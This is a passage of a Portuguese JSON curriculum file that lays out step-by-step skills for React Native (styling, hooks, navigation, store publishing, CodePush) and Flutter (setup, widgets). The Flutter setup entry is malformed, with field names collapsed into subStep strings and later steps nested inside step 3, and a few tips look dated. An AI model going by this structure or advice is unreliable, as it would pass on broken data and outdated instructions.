                                    "Adicione <ScrollView style={{flex:1}}><Image source={{uri:'https://exemplo.com/imagem.jpg'}} style={{width:100,height:100}}/><Text>Descrição</Text></ScrollView>.",
                                    "Teste rolagem adicionando múltiplos elementos.",
                                    "Ajuste estilos para Image (resizeMode: 'cover').",
                                    "Reinicie o Metro e rode o app para verificar."
                                  ],
                                  "verification": "Conteúdo rola suavemente e imagem carrega sem erros.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "URL de imagem pública",
                                    "Emulador com internet",
                                    "Documentação React Native Image"
                                  ],
                                  "tips": [
                                    "Use uri para imagens remotas; require para locais.",
                                    "Defina dimensões fixas na Image para evitar crashes."
                                  ],
                                  "learningObjective": "Integrar componentes de mídia e rolagem para layouts responsivos.",
                                  "commonMistakes": [
                                    "Não definir width/height na Image",
                                    "ScrollView sem flex:1",
                                    "Fontes de imagem inválidas"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Aplicar estilos com StyleSheet para componentes",
                                  "subSteps": [
                                    "Importe StyleSheet de 'react-native'.",
                                    "Crie const styles = StyleSheet.create({ container: {flex:1, backgroundColor:'blue'}, texto: {color:'white', fontSize:18} }).",
                                    "Aplique style={styles.container} na View e style={styles.texto} no Text.",
                                    "Estilize Image e ScrollView similarmente.",
                                    "Teste alterações quentes com Cmd+R (iOS) ou R duas vezes (Android)."
                                  ],
                                  "verification": "Estilos aplicados corretamente: cores, tamanhos e layout visíveis.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação StyleSheet React Native",
                                    "Editor com IntelliSense"
                                  ],
                                  "tips": [
                                    "Use camelCase nos nomes de estilos.",
                                    "Evite inline styles para performance."
                                  ],
                                  "learningObjective": "Dominar estilização modular e performática no React Native.",
                                  "commonMistakes": [
                                    "Misturar StyleSheet com objetos inline",
                                    "Esquecer StyleSheet.create",
                                    "Estilos inválidos como 'background' em vez de 'backgroundColor'"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Gerenciar estado com useState e useEffect",
                                  "subSteps": [
                                    "Importe {useState, useEffect} de 'react'.",
                                    "Declare const [contador, setContador] = useState(0);.",
                                    "Adicione <TouchableOpacity onPress={()=>setContador(contador+1)}><Text>{contador}</Text></TouchableOpacity>.",
                                    "Use useEffect(() => {console.log('Contador mudou:', contador);}, [contador]);.",
                                    "Teste interações e verifique logs no console."
                                  ],
                                  "verification": "Estado atualiza ao toque e useEffect loga mudanças.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Documentação Hooks React",
                                    "Console do Metro (npx react-native log-android)"
                                  ],
                                  "tips": [
                                    "Dependências em useEffect evitam loops infinitos.",
                                    "useState para estado local simples."
                                  ],
                                  "learningObjective": "Implementar estado reativo e efeitos colaterais em componentes.",
                                  "commonMistakes": [
                                    "useEffect sem array de dependências",
                                    "Mutar estado diretamente",
                                    "Esquecer import de TouchableOpacity"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar todos os elementos em um componente completo",
                                  "subSteps": [
                                    "Combine View, Text, Image, ScrollView com estilos.",
                                    "Adicione estado para toggle visibilidade de Image.",
                                    "Use useEffect para carregar dados iniciais (ex: fetch simulado).",
                                    "Refatore para componente reutilizável exportado.",
                                    "Teste em dispositivo real para performance."
                                  ],
                                  "verification": "Componente completo funciona: rola, estiliza, reage a interações.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Dispositivo físico via USB",
                                    "Cable USB debugging"
                                  ],
                                  "tips": [
                                    "Extraia componentes em arquivos separados para modularidade.",
                                    "Use React Developer Tools para debug."
                                  ],
                                  "learningObjective": "Construir componentes funcionais e integrados.",
                                  "commonMistakes": [
                                    "Performance ruim sem otimização",
                                    "Estados não sincronizados",
                                    "Estilos conflituosos"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um 'PerfilCard' com ScrollView contendo foto (Image), nome/descrição (Text em View estilizada), botão toggle para mostrar/esconder bio usando useState, e useEffect para logar visualizações. Estilize com StyleSheet para tema dark/light.",
                              "finalVerifications": [
                                "App renderiza todos componentes sem crashes.",
                                "Estilos StyleSheet aplicados consistentemente.",
                                "useState atualiza UI reativamente.",
                                "useEffect executa apenas quando necessário.",
                                "ScrollView rola conteúdo longo.",
                                "Image carrega e redimensiona corretamente."
                              ],
                              "assessmentCriteria": [
                                "Código limpo, indentado e comentado.",
                                "Sem warnings/erros no console.",
                                "Performance fluida (60fps em interações).",
                                "Reutilização de estilos via StyleSheet.",
                                "Estados gerenciados corretamente sem re-renders desnecessários.",
                                "Compatibilidade iOS/Android."
                              ],
                              "crossCurricularConnections": [
                                "Programação Web: Paralelos com React e CSS-in-JS.",
                                "Design UI/UX: Aplicação de princípios de layout flexbox.",
                                "Gestão de Projetos: Modularidade e componentes reutilizáveis.",
                                "Matemática Computacional: Cálculos de dimensões e posicionamento.",
                                "Inglês Técnico: Leitura de docs oficiais React Native."
                              ],
                              "realWorldApplication": "Construção de telas de apps como Instagram (feeds roláveis com imagens e estados de like) ou e-commerce (cards de produtos com toggle de detalhes), formando a base para apps cross-platform escaláveis."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "26.3.1.2.1"
                            ]
                          },
                          {
                            "id": "26.3.1.2.3",
                            "name": "Implementar navegação",
                            "description": "Usar React Navigation para criar stacks, tabs e drawers, configurando rotas, parâmetros e navegação condicional entre telas.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Instalar e Configurar React Navigation",
                                  "subSteps": [
                                    "Instale as dependências necessárias via npm ou yarn: @react-navigation/native, @react-navigation/native-stack, react-native-screens e react-native-safe-area-context.",
                                    "Configure o app para iOS e Android seguindo a documentação oficial, incluindo pod install para iOS.",
                                    "Crie um arquivo de navegação raiz envolvendo o NavigationContainer.",
                                    "Teste a configuração básica criando uma tela simples e navegando para ela.",
                                    "Adicione suporte a gesture navigation e animações básicas."
                                  ],
                                  "verification": "Execute o app em simulador/emulador e confirme que não há erros de importação ou crash ao abrir.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "React Native CLI",
                                    "Node.js/npm/yarn",
                                    "Documentação oficial React Navigation",
                                    "Simulador iOS/Android"
                                  ],
                                  "tips": "Sempre rode 'npx pod-install' após instalações no iOS para evitar erros de linking.",
                                  "learningObjective": "Entender a instalação e setup inicial do React Navigation em projetos React Native.",
                                  "commonMistakes": [
                                    "Esquecer de instalar react-native-screens",
                                    "Não configurar SafeAreaProvider",
                                    "Ignorar diferenças entre Expo e bare React Native"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Stack Navigator",
                                  "subSteps": [
                                    "Crie um Stack.Navigator com duas telas iniciais (ex: HomeScreen e DetailsScreen).",
                                    "Configure opções como screenOptions para headerStyle e headerTitle.",
                                    "Implemente navegação com navigation.navigate('Details') passando parâmetros iniciais.",
                                    "Receba parâmetros na tela destino com route.params.",
                                    "Adicione botão de voltar e teste navegação para trás com navigation.goBack()."
                                  ],
                                  "verification": "Navegue de Home para Details passando um parâmetro (ex: nome) e visualize-o na tela Details; volte sem erros.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Editor de código (VS Code)",
                                    "Exemplo de código Stack Navigator da docs",
                                    "Dispositivo/simulador para testes"
                                  ],
                                  "tips": "Use TypeScript para tipar os params do route para evitar erros em runtime.",
                                  "learningObjective": "Dominar Stack Navigator para fluxos lineares de navegação com parâmetros.",
                                  "commonMistakes": [
                                    "Não definir initialRouteName",
                                    "Passar params incorretos sem validação",
                                    "Header não customizado levando a overlaps"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Bottom Tab Navigator",
                                  "subSteps": [
                                    "Instale @react-navigation/bottom-tabs.",
                                    "Crie um Tab.Navigator com 3-4 tabs (ex: Home, Search, Profile).",
                                    "Configure tabBarOptions como activeTintColor e icons com react-native-vector-icons.",
                                    "Aninhe Stack dentro de Tab para navegação profunda por aba.",
                                    "Teste switching entre tabs e persista estado por aba."
                                  ],
                                  "verification": "Toque em tabs diferentes, navegue dentro de uma aba e confirme isolamento de navegação entre tabs.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "react-native-vector-icons",
                                    "Documentação Bottom Tabs",
                                    "Ícones gratuitos como Ionicons"
                                  ],
                                  "tips": "Lazy loading com lazy={true} melhora performance em apps grandes.",
                                  "learningObjective": "Criar interfaces tab-based para acesso rápido a seções principais do app.",
                                  "commonMistakes": [
                                    "Não instalar icon library",
                                    "Tabs não responsivas em diferentes tamanhos de tela",
                                    "Stack aninhado sem listener"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Drawer Navigator",
                                  "subSteps": [
                                    "Instale @react-navigation/drawer e @react-navigation/drawer (com react-native-gesture-handler).",
                                    "Crie Drawer.Navigator com screens para menu lateral (ex: Home, Settings, About).",
                                    "Customizar drawerContent com lista personalizada e gestos de swipe.",
                                    "Integre com autenticação para mostrar/hide itens condicionalmente.",
                                    "Teste abertura/fechamento e navegação via drawer."
                                  ],
                                  "verification": "Abra drawer via gesture ou botão, navegue para uma tela e feche sem bugs.",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "react-native-gesture-handler",
                                    "Docs Drawer Navigator"
                                  ],
                                  "tips": "Use useDrawerStatus para reações ao estado do drawer.",
                                  "learningObjective": "Implementar navegação lateral para menus e configurações.",
                                  "commonMistakes": [
                                    "Gesture handler não no topo da bundle",
                                    "Drawer items vazios sem contentComponent",
                                    "Conflitos com outros navigators"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Configurar Rotas Avançadas, Parâmetros e Navegação Condicional",
                                  "subSteps": [
                                    "Defina rotas dinâmicas com getId e parsers para params complexos.",
                                    "Implemente navegação condicional com navigation.dispatch e CommonActions.",
                                    "Use context ou Redux para estado global afetando navegação (ex: auth guard).",
                                    "Adicione deep linking básico com linking config.",
                                    "Teste cenários como reset stack após login."
                                  ],
                                  "verification": "Navegação condicional funciona (ex: redireciona para login se não auth) e params complexos são passados/recebidos corretamente.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Exemplos de auth flow na docs",
                                    "React Context API"
                                  ],
                                  "tips": "Sempre use navigation.replace para substituir stacks em fluxos críticos.",
                                  "learningObjective": "Gerenciar navegação avançada com condições e estados compartilhados.",
                                  "commonMistakes": [
                                    "Params não validados causando crashes",
                                    "Navegação condicional sem fallbacks",
                                    "Deep links sem prefix configurado"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app de gerenciamento de tarefas: Home (lista via Stack), Detalhes da Tarefa (com params), Tabs para Tarefas/Pendentes/Concluídas, Drawer para Perfil/Configurações. Navegação condicional: se não logado, drawer redireciona para Login.",
                              "finalVerifications": [
                                "App inicia sem erros de navegação e todas telas são acessíveis.",
                                "Parâmetros são passados e exibidos corretamente entre telas.",
                                "Switch entre tabs/drawer é fluido com animações nativas.",
                                "Navegação condicional bloqueia/permite acesso baseado em estado.",
                                "Back button e gestures funcionam em todos navigators.",
                                "Performance sem lags em transições (teste em device real)."
                              ],
                              "assessmentCriteria": [
                                "Código modular com navigators separados em arquivos próprios.",
                                "Uso correto de TypeScript/props para routes e params.",
                                "Customizações visuais (headers, icons, cores) aplicadas consistentemente.",
                                "Tratamento de erros em navegação (ex: tela não encontrada).",
                                "Integração perfeita entre Stack, Tabs e Drawer sem conflitos.",
                                "Documentação inline no código explicando decisões de navegação."
                              ],
                              "crossCurricularConnections": [
                                "UI/UX Design: Princípios de navegação intuitiva e Material Design.",
                                "Gestão de Estado: Integração com Context/Redux para auth e dados globais.",
                                "Segurança: Guards condicionais para rotas protegidas.",
                                "Performance: Otimização de lazy loading e memory leaks em navigators.",
                                "Testes: Unitários para funções de navegação com @react-navigation/testing."
                              ],
                              "realWorldApplication": "Em apps e-commerce como Mercado Livre Mobile: Stack para fluxo de compra (produto > carrinho > pagamento), Tabs para categorias/home/perfil, Drawer para conta/pedidos, com navegação condicional pós-login e params para detalhes de produto."
                            },
                            "estimatedTime": "2.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "26.3.1.2.2"
                            ]
                          },
                          {
                            "id": "26.3.1.2.4",
                            "name": "Publicar app em stores",
                            "description": "Gerar builds para Android (APK/AAB) e iOS (IPA), configurar assinaturas, otimizar para App Store e Google Play, e lidar com atualizações over-the-air via CodePush.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar o Projeto React Native para Builds",
                                  "subSteps": [
                                    "Atualize dependências com yarn install ou npm install.",
                                    "Configure android/app/build.gradle para suportar AAB (bundle release).",
                                    "Gere chaves de assinatura: keytool para Android keystore e Apple Developer para iOS certificates.",
                                    "Atualize react-native.config.js e app.json com configurações de build.",
                                    "Teste builds locais com react-native run-android --variant=release e react-native run-ios --configuration Release."
                                  ],
                                  "verification": "Projeto compila sem erros em modo release para ambas as plataformas.",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "Android Studio",
                                    "Xcode",
                                    "Java JDK 11+",
                                    "Apple Developer Account",
                                    "Google Play Console Account"
                                  ],
                                  "tips": "Use bundles em vez de APKs para otimização no Google Play.",
                                  "learningObjective": "Entender configurações pré-build para garantir compatibilidade cross-platform.",
                                  "commonMistakes": [
                                    "Esquecer de alinhar versões de gradle e Xcode",
                                    "Usar senhas fracas em keystores",
                                    "Ignorar proguard rules para obfuscation"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar Builds de Release para Android (APK/AAB)",
                                  "subSteps": [
                                    "Configure gradlew assembleRelease ou bundleRelease no terminal.",
                                    "Assine o build com apksigner ou ./gradlew bundleRelease --keystore.",
                                    "Otimize com R8/ProGuard ativado em build.gradle.",
                                    "Teste o APK/AAB em dispositivo/emulador com adb install.",
                                    "Valide o bundle com bundletool para simular upload."
                                  ],
                                  "verification": "AAB/APK gerado em android/app/build/outputs/bundle/release/ e instala corretamente.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Keystore Android (.jks)",
                                    "Bundletool CLI",
                                    "ADB tools"
                                  ],
                                  "tips": "Prefira AAB para Play Store; use android.bundle.enableUncompressedNativeLibs=false para reduzir tamanho.",
                                  "learningObjective": "Dominar geração e assinatura de builds Android otimizados.",
                                  "commonMistakes": [
                                    "Não configurar signingConfigs corretamente",
                                    "Falhar em minifyEnabled true",
                                    "Ignorar bundletool para validação pré-upload"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Gerar Builds de Release para iOS (IPA)",
                                  "subSteps": [
                                    "Abra projeto no Xcode e configure signing com Apple Team ID e Provisioning Profile.",
                                    "Execute Product > Archive no Xcode.",
                                    "No Organizer, valide e distribua para App Store ou Ad Hoc.",
                                    "Exporte IPA com re-sign se necessário via xcodebuild.",
                                    "Teste IPA com TestFlight ou dispositivo físico."
                                  ],
                                  "verification": "IPA exportado em Xcode Organizer e upload bem-sucedido para App Store Connect.",
                                  "estimatedTime": "2-4 horas",
                                  "materials": [
                                    "Xcode 14+",
                                    "Mac com Apple Silicon ou Intel",
                                    "Provisioning Profiles",
                                    "App Store Connect Account"
                                  ],
                                  "tips": "Use Fastlane para automação de builds iOS repetitivos.",
                                  "learningObjective": "Configurar e gerar builds iOS seguros e prontos para submissão.",
                                  "commonMistakes": [
                                    "Mismatch de bundle ID",
                                    "Certificates expirados",
                                    "Não exportar com bitcode enabled"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Submeter e Otimizar para App Store e Google Play",
                                  "subSteps": [
                                    "Crie app listing no App Store Connect e Google Play Console com screenshots e descrições.",
                                    "Upload AAB/IPA via Xcode Organizer ou Play Console Internal Testing.",
                                    "Configure metadados: ASO keywords, privacy policy, permissions justification.",
                                    "Submeta para review e monitore status.",
                                    "Otimize performance: reduza app size, adicione analytics."
                                  ],
                                  "verification": "App em revisão ou publicado nas stores com status aprovado.",
                                  "estimatedTime": "3-5 horas + tempo de review",
                                  "materials": [
                                    "App Store Connect",
                                    "Google Play Console",
                                    "Screenshots e ícones otimizados"
                                  ],
                                  "tips": "Use App thinning para iOS e Dynamic Delivery para Android.",
                                  "learningObjective": "Otimizar submissões para aprovação rápida e visibilidade.",
                                  "commonMistakes": [
                                    "Falta de privacy manifest",
                                    "Ícones errados",
                                    "Não testar em múltiplos devices"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Configurar Atualizações Over-the-Air com CodePush",
                                  "subSteps": [
                                    "Instale appcenter-cli e configure login com appcenter login.",
                                    "Crie CodePush deployment: appcenter codepush deployment list/add.",
                                    "Publique JS bundle: appcenter codepush release-react -a <owner/app> -d Production.",
                                    "Configure mandatory updates e targeting por versão.",
                                    "Teste OTA em staging e monitore logs."
                                  ],
                                  "verification": "Atualização JS aplicada via OTA sem rebuild completo.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Microsoft App Center Account",
                                    "appcenter-cli",
                                    "React Native CodePush plugin"
                                  ],
                                  "tips": "Use targeted releases para beta testers primeiro.",
                                  "learningObjective": "Implementar atualizações rápidas sem re-submissão às stores.",
                                  "commonMistakes": [
                                    "Não sincronizar app version com codepush",
                                    "Ignorar rollback capability",
                                    "Exceder bundle size limits"
                                  ]
                                }
                              ],
                              "practicalExample": "Desenvolva um app React Native de lista de tarefas simples, gere APK/AAB para Android, IPA para iOS, submeta para stores internas de teste e implemente CodePush para adicionar uma feature de notificações sem novo build.",
                              "finalVerifications": [
                                "Builds APK/AAB/IPA gerados e assinados sem erros.",
                                "Apps submetidos e aprovados em App Store Connect e Google Play Console.",
                                "CodePush deployment criado e release testado com sucesso.",
                                "App size otimizado abaixo de 100MB para Android e 50MB para iOS.",
                                "Testes em dispositivos reais confirmam funcionalidade.",
                                "Documentação de keystores e deployments salva com segurança."
                              ],
                              "assessmentCriteria": [
                                "Precisão na configuração de assinaturas (sem erros de signing).",
                                "Eficiência de builds (tempo de geração e tamanho otimizados).",
                                "Sucesso na submissão (sem rejeições iniciais por metadados).",
                                "Funcionalidade OTA via CodePush (atualização sem crash).",
                                "Cobertura de testes em múltiplas plataformas e devices.",
                                "Qualidade da otimização ASO e performance."
                              ],
                              "crossCurricularConnections": [
                                "Segurança da Informação: Gerenciamento de certificados e keystores.",
                                "DevOps: Automação de CI/CD com Fastlane e App Center.",
                                "Marketing Digital: ASO e app store optimization.",
                                "Gestão de Projetos: Planejamento de releases e atualizações.",
                                "Qualidade de Software: Testes de release e verificações."
                              ],
                              "realWorldApplication": "Empresas como Uber e Instagram usam React Native com CodePush para lançar apps cross-platform rapidamente, permitindo atualizações de UI e features sem aprovações demoradas das stores, reduzindo custos e tempo de mercado."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": [
                              "26.3.1.2.3"
                            ]
                          }
                        ]
                      },
                      {
                        "id": "26.3.1.3",
                        "name": "Flutter",
                        "description": "Framework do Google usando Dart para criar UIs nativas compiladas para múltiplas plataformas a partir de um único código, com ênfase em widgets declarativos e hot reload.",
                        "specificSkills": [
                          {
                            "id": "26.3.1.3.1",
                            "name": "Configurar ambiente Flutter",
                            "description": "Instalar Flutter SDK, Dart, Android Studio e Xcode, verificar configuração com flutter doctor e criar o primeiro projeto com flutter create.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Baixar e Instalar o Flutter SDK",
                                  "subSteps": [
                                    "Acesse o site oficial flutter.dev e selecione o canal estável (stable).",
                                    "Baixe o arquivo ZIP para sua plataforma (Windows, macOS ou Linux).",
                                    "Extraia o arquivo para um diretório permanente, como C:\\src\\flutter (Windows) ou ~/development/flutter (macOS/Linux).",
                                    "Adicione o caminho do diretório bin do Flutter ao PATH do sistema.",
                                    "Reinicie o terminal ou prompt de comando para carregar as mudanças."
                                  ],
                                  "verification": "Execute 'flutter --version' no terminal e confirme que a versão do Flutter e Dart é exibida.",
                                  "estimatedTime": "20 minutos",
                                  "materials": "Computador com Windows/macOS/Linux, conexão à internet, editor de variáveis de ambiente (como .bashrc ou System Properties).",
                                  "tips": "Use o gerenciador de canais 'flutter channel stable' e 'flutter upgrade' para manter atualizado.",
                                  "learningObjective": "Entender como instalar e configurar o SDK Flutter localmente.",
                                  "commonMistakes": "Esquecer de adicionar ao PATH, levando a 'flutter não encontrado'; extrair em locais com espaços no nome."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Instalar Android Studio e Configurar SDK Android",
                                  "subSteps": [
                                    "Baixe e instale o Android Studio do site developer.android.com/studio.",
                                    "Abra o Android Studio, vá em SDK Manager e instale o Android SDK mais recente.",
                                    "Instale as imagens de emulador (AVD) para pelo menos uma API level (ex: Android 13).",
                                    "Aceite as licenças do Android SDK executando 'flutter doctor --android-licenses'.",
                                    "Crie um emulador virtual (AVD) via AVD Manager."
                                  ],
                                  "verification": "Execute 'flutter doctor' e verifique se Android toolchain está marcado como OK.",
                                  "estimatedTime": "40 minutos",
                                  "materials": "Android Studio installer, espaço em disco (mínimo 10GB), conexão à internet.",
                                  "tips": "Ative 'Android SDK Command-line Tools' no SDK Manager para suporte completo ao Flutter.",
                                  "learningObjective": "Configurar o ambiente Android para desenvolvimento cross-platform.",
                                  "commonMistakes": "Não aceitar licenças, causando erros de build; usar API levels incompatíveis com Flutter."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Instalar Xcode (para macOS) e Configurar iOS",
                                  "subSteps": [
                                    "Instale o Xcode pela App Store (versão 14+ recomendada).",
                                    "Abra o Terminal e execute 'sudo xcode-select --install' para command line tools.",
                                    "Aceite os termos do Xcode abrindo-o uma vez.",
                                    "Instale CocoaPods com 'sudo gem install cocoapods'.",
                                    "Execute 'pod setup' para inicializar o repositório.",
                                    "verification: ",
                                    "estimatedTime: ",
                                    "30 minutos",
                                    "materials: ",
                                    "macOS Ventura+, App Store, Ruby/Gems pré-instalados.",
                                    "tips: ",
                                    "Para Intel Macs, use Rosetta se necessário; teste com 'flutter doctor'.",
                                    "learningObjective: ",
                                    "Preparar ambiente iOS para builds Flutter.",
                                    "commonMistakes: ",
                                    "Pular CocoaPods, impedindo iOS builds; não abrir Xcode primeiro.",
                                    {
                                      "stepNumber": 4,
                                      "title": "Verificar Configuração com Flutter Doctor",
                                      "subSteps": [
                                        "Execute 'flutter doctor' no terminal.",
                                        "Analise a saída e resolva quaisquer '!' ou '✗' (ex: instale Chrome para web se necessário).",
                                        "Execute 'flutter doctor -v' para detalhes verbose.",
                                        "Confirme que Flutter, Dart, Android e Xcode (se Mac) estão OK.",
                                        "Execute 'flutter devices' para listar dispositivos/emuladores disponíveis."
                                      ],
                                      "verification": "'flutter doctor' mostra apenas checks verdes ou avisos menores.",
                                      "estimatedTime": "15 minutos",
                                      "materials": "Terminal acessível.",
                                      "tips": "Rode em modo verbose para diagnósticos; atualize PATH se necessário.",
                                      "learningObjective": "Diagnosticar e corrigir problemas de configuração.",
                                      "commonMistakes": "Ignorar avisos de licenças ou PATH incorreto."
                                    },
                                    {
                                      "stepNumber": 5,
                                      "title": "Criar e Testar o Primeiro Projeto Flutter",
                                      "subSteps": [
                                        "Crie um novo projeto: 'flutter create meu_primeiro_app'.",
                                        "Navegue para o diretório: 'cd meu_primeiro_app'.",
                                        "Execute 'flutter run' com emulador aberto ou dispositivo conectado.",
                                        "Verifique o app padrão (contador) rodando no emulador.",
                                        "Pare o app com 'q' e teste hot reload com 'r'."
                                      ],
                                      "verification": "App roda sem erros, hot reload funciona.",
                                      "estimatedTime": "20 minutos",
                                      "materials": "Emulador Android/iOS rodando.",
                                      "tips": "Use 'flutter run -d <device-id>' para dispositivo específico.",
                                      "learningObjective": "Validar ambiente criando e executando projeto.",
                                      "commonMistakes": "Não ter emulador aberto; erros de permissão em pastas."
                                    }
                                  ],
                                  "practicalExample": "Configure o ambiente e crie 'app_contador'. Rode em emulador Android: o app mostra um botão que incrementa contador. Use hot reload para mudar cor do botão editando lib/main.dart.",
                                  "finalVerifications": [
                                    "flutter doctor exibe todos checks OK.",
                                    "flutter create gera projeto sem erros.",
                                    "Projeto roda em emulador Android e/ou iOS.",
                                    "Hot reload e hot restart funcionam.",
                                    "flutter devices lista emuladores corretamente.",
                                    "'flutter pub get' resolve dependências."
                                  ],
                                  "assessmentCriteria": [
                                    "Instalação completa sem erros críticos no doctor.",
                                    "Todos steps executados com verificações positivas.",
                                    "Projeto inicial compilado e executado em pelo menos uma plataforma.",
                                    "Conhecimento demonstrado de troubleshooting comum.",
                                    "Tempo total dentro do estimado (2 horas).",
                                    "Documentação de passos personalizados criada."
                                  ],
                                  "crossCurricularConnections": [
                                    "Programação em Dart (linguagem principal do Flutter).",
                                    "Desenvolvimento nativo Android/iOS (toolchains integrados).",
                                    "Gerenciamento de ambientes DevOps (PATH, SDKs).",
                                    "Testes e debugging em mobile.",
                                    "Versionamento com Git (integração Flutter)."
                                  ],
                                  "realWorldApplication": "Em startups e empresas de apps como Nubank ou iFood, configurar Flutter permite devs criarem apps iOS/Android simultaneamente, reduzindo custos e tempo de deploy em 50% comparado a stacks nativas."
                                }
                              ]
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": [
                              "26.3.1.1.1"
                            ]
                          },
                          {
                            "id": "26.3.1.3.2",
                            "name": "Construir interfaces com widgets",
                            "description": "Utilizar widgets como Scaffold, AppBar, Column, Row, ListView e CustomPaint para criar layouts responsivos, aplicando temas e animações básicas com AnimatedBuilder.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar estrutura básica com Scaffold e AppBar",
                                  "subSteps": [
                                    "Criar um novo projeto Flutter com 'flutter create meu_app'.",
                                    "Importar o pacote material: import 'package:flutter/material.dart';.",
                                    "Definir a classe principal como StatelessWidget com runApp(MyApp()).",
                                    "Implementar MaterialApp com home: Scaffold(appBar: AppBar(title: Text('Meu App')))."
                                  ],
                                  "verification": "Executar o app e verificar se aparece uma AppBar com título no topo da tela.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Flutter SDK instalado",
                                    "VS Code ou Android Studio",
                                    "Documentação oficial do Scaffold: https://api.flutter.dev/flutter/material/Scaffold-class.html"
                                  ],
                                  "tips": [
                                    "Use hot reload (r) para testar mudanças rapidamente.",
                                    "Sempre envolva em MaterialApp para temas consistentes."
                                  ],
                                  "learningObjective": "Compreender a estrutura hierárquica básica de uma tela Flutter usando Scaffold como container principal.",
                                  "commonMistakes": [
                                    "Esquecer de importar material.dart, causando erros de widget indefinido.",
                                    "Não definir home no MaterialApp, resultando em tela branca."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Criar layouts flexíveis com Column e Row",
                                  "subSteps": [
                                    "Adicionar body no Scaffold com Column(mainAxisAlignment: MainAxisAlignment.center).",
                                    "Inserir múltiplos widgets filhos na Column, como Text e ElevatedButton.",
                                    "Usar Row para layout horizontal, com children: [Icon(Icons.star), Text('Estrela')].",
                                    "Aplicar Expanded ou Flexible para responsividade em diferentes tamanhos de tela."
                                  ],
                                  "verification": "Redimensionar o emulador e confirmar que o layout se adapta sem overflow.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Emulador Android/iOS ou dispositivo físico",
                                    "Documentação Column/Row: https://api.flutter.dev/flutter/widgets/Column-class.html"
                                  ],
                                  "tips": [
                                    "Use crossAxisAlignment para alinhamento perpendicular.",
                                    "Teste em portrait e landscape para responsividade."
                                  ],
                                  "learningObjective": "Dominar arranjos verticais e horizontais para construir interfaces responsivas.",
                                  "commonMistakes": [
                                    "Não usar Expanded em Row/Column com múltiplos filhos, causando overflow.",
                                    "Confundir mainAxisSize com flexibilidade desnecessária."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar ListView para conteúdo dinâmico",
                                  "subSteps": [
                                    "Substituir body por ListView.builder(itemCount: 20, itemBuilder: (context, index) => ListTile(title: Text('Item $index'))).",
                                    "Adicionar separator com Divider() entre itens.",
                                    "Tornar responsivo com padding e shrinkWrap: true se necessário.",
                                    "Testar scroll em listas longas."
                                  ],
                                  "verification": "Scroll pela lista e verificar que itens são renderizados sob demanda sem lag.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Exemplo de dados mock: List<String> items = List.generate(50, (i) => 'Item $i');",
                                    "Docs ListView: https://api.flutter.dev/flutter/widgets/ListView-class.html"
                                  ],
                                  "tips": [
                                    "Prefira ListView.builder para listas grandes para performance.",
                                    "Use key: ValueKey(index) para animações suaves."
                                  ],
                                  "learningObjective": "Gerenciar listas scrolláveis eficientes para dados dinâmicos.",
                                  "commonMistakes": [
                                    "Usar ListView sem builder em listas grandes, consumindo muita memória.",
                                    "Esquecer itemExtent para altura fixa, afetando performance."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Adicionar CustomPaint e animações básicas",
                                  "subSteps": [
                                    "Criar uma classe CustomPainter com paint(Canvas canvas, Size size).",
                                    "Desenhar formas simples: canvas.drawCircle(Offset(50,50), 20, Paint()).",
                                    "Usar CustomPaint em um Container no body.",
                                    "Envolver em AnimatedBuilder com AnimationController para animação de rotação ou escala."
                                  ],
                                  "verification": "Executar e ver a animação rodando suavemente ao iniciar o app.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Documentação CustomPaint: https://api.flutter.dev/flutter/widgets/CustomPaint-class.html",
                                    "Exemplo de AnimationController"
                                  ],
                                  "tips": [
                                    "Init/dispose o controller no StatefulWidget.",
                                    "Use TickerProviderStateMixin para animações."
                                  ],
